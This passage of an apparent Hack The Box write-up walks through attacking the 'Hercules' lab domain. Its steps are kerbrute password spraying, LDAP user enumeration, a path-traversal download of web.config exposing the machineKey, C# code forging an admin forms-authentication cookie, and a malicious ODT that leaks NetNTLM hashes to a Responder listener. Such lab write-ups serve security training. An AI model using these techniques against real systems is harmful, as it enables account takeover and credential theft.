  [20] 'd' -> 'change*th1s_p@ssw()rd'
  [21] '!' -> 'change*th1s_p@ssw()rd!'
  [22] '!' -> 'change*th1s_p@ssw()rd!!'
[+] Extraído: change*th1s_p@ssw()rd!!

[*] Probando: elijah.m
[-] Sin descripción

[*] Probando: ramona.l
[-] Sin descripción

[*] Probando: clarissa.c
[-] Sin descripción

[*] Probando: camilla.b
[-] Sin descripción

[*] Probando: shae.j
[-] Sin descripción

[*] Probando: tish.c
[-] Sin descripción

[*] Probando: zeke.s
[-] Sin descripción

[*] Probando: mikayla.a
[-] Sin descripción

[*] Probando: winda.s
[-] Sin descripción

❯ cat resultados.txt     
johnathan.j:change*th1s_p@ssw()rd!!
```

We'll try to validate these credentials against that user. From the `NetExec` output, we get `KDC_ERR_PREAUTH_FAILED`, meaning the credentials aren't valid.

```bash
❯ nxc ldap $IP -u 'johnathan.j' -p 'change*th1s_p@ssw()rd!!' -k                 
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
```

We try logging into [https://dc.hercules.htb/Login](https://dc.hercules.htb/Login) with `johnathan.j`'s credentials, but it also gives us `Login attempt failed`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021004726.png)

---
### Password Spraying

Since we had some credentials, our next move was a `Password Spraying` to check whether they work for any of the users we have. This technique is quieter than a `Brute Force` because it tries the same password across many users, which means we're unlikely to lock anyone out.

From the results, we validate credentials for the user `ken.w`.

```bash
❯ kerbrute passwordspray -d hercules.htb --dc DC.hercules.htb users.txt 'change*th1s_p@ssw()rd!!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/21/25 - Ronnie Flathers @ropnop

2025/10/21 00:48:03 >  Using KDC(s):
2025/10/21 00:48:03 >  	DC.hercules.htb:88

2025/10/21 00:48:04 >  [+] VALID LOGIN:	ken.w@hercules.htb:change*th1s_p@ssw()rd!!
2025/10/21 00:48:04 >  Done! Tested 36 logins (1 successes) in 0.665 seconds
```

---
## Auth as web_admin
###  Web Portal Enumeration

We try logging into the `Hercules SSO` portal ([https://DC.hercules.htb/Login](https://DC.hercules.htb/Login)) with `ken.w`'s credentials and finally get in.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021004921.png)

In the `Mail` section, `ken.w` has 3 emails. We'll go through them to see if they hold any useful info.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021005003.png)

The email titled `Site Maintenance` tells us the following. The most interesting bit is a new user called `web_admin` that we hadn't validated at domain level.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021005024.png)

We'll validate whether that user exists at domain level with `NetExec`. On the first command with the username `web_admin`, we get a `KDC_ERR_PREAUTH_FAILED` error, while entering `web_admin_FAKE` gives us `KDC_ERR_C_PRINCIPAL_UNKNOWN`.

The reason is that the first result actually confirmed the user does exist in the domain, but since we gave it empty credentials, it returns an auth failure. The second one, on the other hand, just meant it couldn't find the user in the domain.

```bash
❯ nxc ldap $IP -u 'web_admin' -p '' -k                  
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [-] hercules.htb\web_admin: KDC_ERR_PREAUTH_FAILED

❯ nxc ldap $IP -u 'web_admin_FAKE' -p '' -k
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [-] hercules.htb\web_admin_FAKE: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

Now that we have valid domain credentials for `ken.w`, we can enumerate the whole domain user list through `NetExec` against LDAP with the `--users-export` flag.

```bash
❯ nxc ldap $IP -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -k --users                                                          
LDAP        10.129.90.250   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.90.250   389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
LDAP        10.129.90.250   389    DC               [*] Enumerated 48 domain users: hercules.htb
LDAP        10.129.90.250   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.90.250   389    DC               Administrator                 2025-10-17 12:49:44 1        Built-in account for administering the computer/domain      
LDAP        10.129.90.250   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.90.250   389    DC               krbtgt                        2024-12-04 02:39:35 0        Key Distribution Center Service Account                     
LDAP        10.129.90.250   389    DC               jessica.e                                                                                                              
LDAP        10.129.90.250   389    DC               mikayla.a                                                                                                              
LDAP        10.129.90.250   389    DC               stephanie.w                                                                                                            
LDAP        10.129.90.250   389    DC               johanna.f                                                                                                              
LDAP        10.129.90.250   389    DC               heather.s                                                                                                              
LDAP        10.129.90.250   389    DC               camilla.b                                                                                                              
LDAP        10.129.90.250   389    DC               taylor.m                      2024-12-04 02:44:43 0                                                                    
LDAP        10.129.90.250   389    DC               fernando.r                    2025-10-20 21:16:40 0                                                                    
LDAP        10.129.90.250   389    DC               james.s                       2024-12-04 02:44:43 0                                                                    
LDAP        10.129.90.250   389    DC               anthony.r                     2024-12-04 02:44:43 0                                                                    
LDAP        10.129.90.250   389    DC               iis_webserver$                2024-12-04 02:44:43 0                                                                    
LDAP        10.129.90.250   389    DC               iis_hadesapppool$             2024-12-04 02:44:44 0                                                                    
LDAP        10.129.90.250   389    DC               iis_apppoolidentity$          2024-12-04 02:44:44 0                                                                    
LDAP        10.129.90.250   389    DC               iis_defaultapppool$           2024-12-04 02:44:44 0                                                                    
LDAP        10.129.90.250   389    DC               auditor                       2024-12-04 02:44:44 1                                                                    
LDAP        10.129.90.250   389    DC               vincent.g                     2024-12-04 02:44:45 1                                                                    
LDAP        10.129.90.250   389    DC               nate.h                        2024-12-04 02:44:45 1                                                                    
LDAP        10.129.90.250   389    DC               stephen.m                     2024-12-04 02:44:45 1                                                                    
LDAP        10.129.90.250   389    DC               mark.s                        2024-12-04 02:44:46 1                                                                    
LDAP        10.129.90.250   389    DC               elijah.m                      2024-12-04 02:44:46 1                                                                    
LDAP        10.129.90.250   389    DC               angelo.o                      2024-12-04 02:44:46 1                                                                    
LDAP        10.129.90.250   389    DC               ashley.b                      2024-12-04 02:44:46 1                                                                    
LDAP        10.129.90.250   389    DC               clarissa.c                    2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               winda.s                       2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               rene.s                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               will.s                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               zeke.s                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               adriana.i                     2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               tish.c                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               jennifer.a                    2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               shae.j                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               joel.c                        2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               jacob.b                       2024-12-04 02:44:47 1                                                                    
LDAP        10.129.90.250   389    DC               web_admin                     2024-12-04 02:44:48 1                                                                    
LDAP        10.129.90.250   389    DC               bob.w                         2024-12-04 02:44:48 1                                                                    
LDAP        10.129.90.250   389    DC               ken.w                         2024-12-04 02:44:48 0                                                                    
LDAP        10.129.90.250   389    DC               johnathan.j                   2024-12-04 02:44:48 2        change*th1s_p@ssw()rd!!                                     
LDAP        10.129.90.250   389    DC               harris.d                      2024-12-04 02:44:48 0                                                                    
LDAP        10.129.90.250   389    DC               ray.n                         2024-12-04 02:44:48 1                                                                    
LDAP        10.129.90.250   389    DC               natalie.a                     2025-10-21 00:46:12 0                                                                    
LDAP        10.129.90.250   389    DC               ramona.l                      2024-12-04 02:44:49 1                                                                    
LDAP        10.129.90.250   389    DC               fiona.c                       2024-12-04 02:44:49 1                                                                    
LDAP        10.129.90.250   389    DC               patrick.s                     2024-12-04 02:44:49 1                                                                    
LDAP        10.129.90.250   389    DC               tanya.r                       2024-12-04 02:44:49 1                                                                    
LDAP        10.129.90.250   389    DC               Admin                         2025-10-17 14:26:46 1                                                                    
LDAP        10.129.90.250   389    DC               [*] Enumerated 48 local users: HERCULES                                                                    
LDAP        10.129.90.250   389    DC               [*] Writing 48 local users to users.txt
```

In the `Forms` section we have a form to send our report. On this first pass of poking around the website's features, we'll try uploading a `.txt` file to see how it reacts.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021010026.png)

When we submit the request, we get this error: `File Upload not permitted`. Looks like our current user doesn't have the permissions needed to do a `File Upload`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021010048.png)

If we submit the form without the `File Upload`, it does seem to go through fine.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251023055535.png)

----
### Local File Inclusion (LFI) on download to retrieve web.config of IIS Server

In the `Downloads` section we get the interface below, with 3 portal forms that we can download through a `Download` button.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021010112.png)

Clicking the download button ends up downloading the selected form. We'll intercept the request to see what's going on behind the scenes.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021010615.png)

Having intercepted the request through `BurpSuite`, we can see the download goes out as a `GET` to `/Home/Download?filename=registration.pdf`. In other words, the `filename` parameter supplies the resource we want to download.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021011130.png)

What we could try is to point at another file, like `Web.Config`, which holds all the IIS web configuration. On our first try with `../web.config`, the server returned a `500 Internal Server Error`.

> The IIS `Web.config` file is an XML document that holds the configuration of an [ASP.NET](https://dotnet.microsoft.com/en-us/apps/aspnet) web application. If it gets exposed, the dangers include leaking sensitive data like database connection strings, authentication info and other sensitive configuration, which could let an attacker gain unauthorized access to information or to the server.
{: .prompt-info }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021011304.png)

Trying again, but going one directory further back with `../../web.config`, we manage to grab the `Web.config` file of the `ASP.NET` web app. The `web.config` file exposes the `machineKey`, which is used to encrypt/decrypt things like `viewState` and cookies in the app.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021011336.png)

> **View State** is a method typically used in **[ASP.NET](https://ASP.NET)** applications to pass state information back and forth to the client. It's a serialized **.NET** object, and it's usually encrypted to prevent tampering and, therefore, deserialization attacks.
>
> A very common attack against **[ASP.NET](https://ASP.NET)** applications like this one with a leaked **machineKey** is to generate a malicious serialized **.NET** object (with something like **[ysoserial.net](https://ysoserial.net)**) and encrypt it with the **machineKey**. When the decryption succeeds, the malicious object gets loaded and code execution is achieved.
>
> The **ViewStateUserKey** property is a protection against this kind of attack. This post does a great job breaking down this attack and how **ViewStateUserKey** helps prevent it.
>
> Via: [0xdf](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis)
{: .prompt-info }

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```

The part of the XML file we care about most is the one containing the `machineKey`.

```xml
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

---
### Decrypt Cookie

Like we said earlier, we can encrypt/decrypt the session cookie using the `machineKey` values. In our case we'll use the GitHub repo below to encrypt/decrypt our cookie, with the goal of forging a valid session cookie for the `web_admin` user we found earlier, who might have more privileges on the website.

Googling around about `machineKey` and how `ASP_NET` handles cookies, we land on a walkthrough by `0xdf` for a box called `Perspective`, where they grab the `web.config` and show how to decrypt the cookie and forge a new one for the web admin, exactly what we want to do here.

- [https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#decrypt-cookie](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#decrypt-cookie)
- [https://github.com/liquidsec/aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools)

The `aspnetCryptTools` repo also walks us through the exact steps.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021011748.png)

In our case we'll use `Visual Studio 2022`, which we can grab from this [link](https://visualstudio.microsoft.com/). We'll create a new project, pick `Console App (.NET Framework)` and hit `Next`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021013833.png)

In the `Configure your new project` window we'll name the project `DecryptCookie` (or whatever we want), pick where to save it and select the Framework version, in this case `.NET Framework 4.7.2`. Once that's set, we hit `Create`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021013855.png)

In the `Program.cs` of the project we created, we need to replace its contents with the ones from the `FormsDecrypt.cs` file in the [aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools) repo. In our case, it complains that a namespace called `Security` doesn't exist in the `System.Web` namespace.

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Security;

namespace FormsTicketCrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            // Test if input arguments were supplied.
            if (args.Length == 0)
            {
                Console.WriteLine("Please supply encrypted forms ticket");
                return;
            }
            string encryptedTicket = args[0];
            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            Console.WriteLine(unencryptedTicket.Version);
            Console.WriteLine(unencryptedTicket.Name);
            Console.WriteLine(unencryptedTicket.IssueDate);
            Console.WriteLine(unencryptedTicket.Expiration);
            Console.WriteLine(unencryptedTicket.IsPersistent);
            Console.WriteLine(unencryptedTicket.UserData);
            Console.WriteLine(unencryptedTicket.CookiePath);
            Console.ReadLine();
        }
    }
}
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014005.png)

To fix that, we'll go to (`Project < Add Reference`).

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014121.png)

In the `Reference Manager` window, we'll select `System.Web` and finally hit `OK`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014201.png)

We'll double-check that the program no longer complains about the missing reference for that namespace.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014237.png)

On the other hand, we'll replace our project's `app.config` with the following; there's also a template in the `aspnetCryptTools` GitHub repo. In our `app.config` we need to drop in the values from the web server's `web.config`.

The values we had to change are these:

- `validationKey`
- `decryptionKey`
- `validation`

```c#
<?xml version="1.0"?>
<configuration>
	<system.web>
		<compilation debug="false" targetFramework="4.0" />
		<machineKey validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" decryption="AES" />
	</system.web>
</configuration>
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014318.png)

Once the files are configured, we compile our project from (`Build < Build Solution`).

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014600.png)

At the bottom we get a message telling us whether the binary compiled successfully, whether we ran into any issue, etc. It also tells us the exact location of the `DecryptCookie.exe` binary we compiled.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021014621.png)

First goal: decrypt our cookie to get its values. To do that, we log back into the portal with `ken.w`'s credentials and grab the value of our `.ASPXAUTH` cookie either with the `Cookie-Editor` extension or via (`F12 < Storage < Cookies < .ASPXAUTH`).

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021015351.png)

We run our compiled binary `DecryptCookie.exe` passing our current `.ASPXAUTH` cookie value as an argument. From the output we can see the decrypted session cookie info.

The values of our cookie are:

- `1` --> the ticket version number.
- `10/21/2025 1:52:54 AM` --> the local date when the ticket was issued.
- `10/21/2025 2:02:54 AM` --> the local date when the ticket expires.
- `False` --> true if the ticket is going to be stored in a persistent cookie (kept across browser sessions); false otherwise. If the ticket is stored in the URL, this value is ignored.
- `Web Users` --> the user-specific data stored with the ticket.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021015507.png)

---
### Forge web_admin Cookie

Next up, time to forge a new cookie for `web_admin`. I'd recommend creating a new project, following the same steps as before.

Here we'll replace the contents of `Program.cs` with the `FormsEncrypt.cs` file from [aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools), following the instructions.

Among the values we need to change:

- `string encryptedTicket` --> we'll put our valid session cookie, i.e. the one for `ken.w`.
- `string replacedUsername` --> we'll put the user we want to forge the new cookie for, in this case `web_admin`.
- `Web Administrators` --> we'll put the `Web Administrators` role to gain admin access. We figured this value out from our decrypted `ken.w` session cookie, where we could see the `Web Users` value.

```c#
using System;
using System.Web.Security;

namespace FormsEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
       
            // Take an existing forms cookie 
            string encryptedTicket = "<ExistingEncryptedTicket>";
            string replacedUsername = "web_admin";

            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
                 //  unencryptedTicket.Name, //comment out if you want to change the username
                   replacedUsername,  //uncomment if you want to change the username
                   DateTime.Now,
                   DateTime.Now.AddMinutes(100000000),
                   unencryptedTicket.IsPersistent,
                   "Web Administrators",
                   "/");

            string encTicket = FormsAuthentication.Encrypt(ticket);
            Console.WriteLine(encTicket);
            Console.Read();
        }
    }
}
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021015931.png)

The project's `App.config` should be the same one used in the previous project.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021015947.png)

We compile the binary from (`Build < Build Solution`) and confirm it compiled successfully.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020013.png)

We run the compiled binary and it forges us a new session cookie for `web_admin`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020051.png)

Back at [https://dc.hercules.htb/Login](https://dc.hercules.htb/Login), we'll swap our session cookie from `ken.w` to `web_admin`. We can do that from (`F12 < Storage < Cookies < .ASPXAUTH`) and replace its value with the forged cookie.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020131.png)

Hitting F5 on the page, we confirm we're now under `web_admin`'s context in the `Hercules SSO` portal.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020150.png)

Checking the `Mail` section, we find two emails we'll go through.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251023054802.png)

The email with the subject `Security Audit` that `web_admin` received lists a bunch of tasks still pending:

- Migrate users to use domain credentials --> confirming the LDAP query exists.
- Disable the registration page.
- For company logins, make sure the site is synced with the KDC.
- Restrict file upload to admins only --> confirming what we ran into earlier with `ken.w`.

Since the `File Upload` we tried earlier has been restricted, and we're now under `web_admin`'s context, maybe we can dig into this feature more closely.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251023054825.png)

---
## Auth as natalie.a

### Burp Intruder - search for valid file extension

Our goal is to abuse the `File Upload`, which the previous email said is restricted to Admins only. What we'll do is fill the data with random values and upload a file, say a `.txt`. Once that's set up, we hit `Submit` and intercept the request through `BurpSuite`, then use `Intruder` to figure out which extensions we're allowed to upload.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020245.png)

If we click the info button in the `Report Submission` section, we get the message below telling us we can use the form to submit a report and the support team will reply within a few minutes.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020431.png)

Once we've intercepted the request, we send it to `Intruder`. There we pick the `Sniper attack` (1), set the payload position (2), add the position (3), load the list of possible extensions below (4) and finally hit `Start attack` to run the check.

```bash
aspx
phar
php
php3
php4
php5
txt
md
zip
pdf
gz
tar
doc
docx
xls
xlsx
odt
ott
ods
odp
odg
docm
dotm
xlsm
csv
yml
yaml
bat
jpg
png
gif
svg
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021020917.png)

From the results, only two of them have a different response size from the rest. In conclusion, we can only upload `.odt` and `.docx` files.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020161355.png)

---
### Creates a malicious ODF document help leak NetNTLM Creds

Looking around for malicious `.odt` documents, we come across the following repo.

> Quick POC to create a malicious ODF that can be used to leak NetNTLM credentials. Usage - Set up responder or similar, create a malicious file and point it at the listener. Works against LibreOffice 6.03 and OpenOffice 4.1.5
{: .prompt-info }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021021008.png)

We clone the [Bad-ODF](https://github.com/lof1sec/Bad-ODF) repo on our box so we can use the exploit mentioned.

```bash
❯ git clone https://github.com/lof1sec/Bad-ODF; cd Bad-ODF
Cloning into 'Bad-ODF'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 5.86 KiB | 5.86 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

Running the `Bad-ODF.py` exploit throws an error saying we're missing `ezodf`. To fix that, we'll spin up a virtual environment and install the requirements the tool needs.

```bash
❯ python3 Bad-ODF.py
ezodf appears to be missing - try: pip install ezodf && pip install --upgrade lxml

❯ python3 -m venv .env && source .env/bin/activate

❯ pip install ezodf && pip install --upgrade lxml
Collecting ezodf
  Downloading ezodf-0.3.2.tar.gz (125 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 125.9/125.9 kB 2.5 MB/s eta 0:00:00
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Building wheels for collected packages: ezodf
  Building wheel for ezodf (pyproject.toml) ... done
  Created wheel for ezodf: filename=ezodf-0.3.2-py2.py3-none-any.whl size=49079 sha256=c9821d25fceb761eb05396c3215ab940ce21ed6cf71ca099182a7f1814373e1a
  Stored in directory: /root/.cache/pip/wheels/bb/23/3b/cce8669e20fa103fa8cd5d060b7e63ebb93cfbebd29a9e5d43
Successfully built ezodf
Installing collected packages: ezodf
Successfully installed ezodf-0.3.2

[notice] A new release of pip is available: 24.0 -> 25.2
[notice] To update, run: pip install --upgrade pip
Collecting lxml
  Using cached lxml-6.0.2-cp311-cp311-manylinux_2_26_x86_64.manylinux_2_28_x86_64.whl.metadata (3.6 kB)
Using cached lxml-6.0.2-cp311-cp311-manylinux_2_26_x86_64.manylinux_2_28_x86_64.whl (5.2 MB)
Installing collected packages: lxml
Successfully installed lxml-6.0.2

[notice] A new release of pip is available: 24.0 -> 25.2
[notice] To update, run: pip install --upgrade pip
```

Once the dependencies are in place, we run the exploit. It asks us for our IP address, where we'll have `Responder` listening to capture the user's NTLMv2 hash. We'll verify it created a new file called `bad.odt`.

```bash
❯ python3 Bad-ODF.py

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk


Please enter IP of listener: 10.10.16.15 

❯ ls -l
.rw-rw---- root root 7.7 KB Tue Oct 21 02:12:21 2025  Bad-ODF.py
.rw-rw---- root root 5.6 KB Tue Oct 21 02:14:35 2025  bad.odt
.rw-rw---- root root 265 B  Tue Oct 21 02:12:21 2025  README.md
```

We'll leave the virtual env with `deactivate`. Then we'll start `Responder` so it's listening on the most important services.

```bash
❯ deactivate

❯ Responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
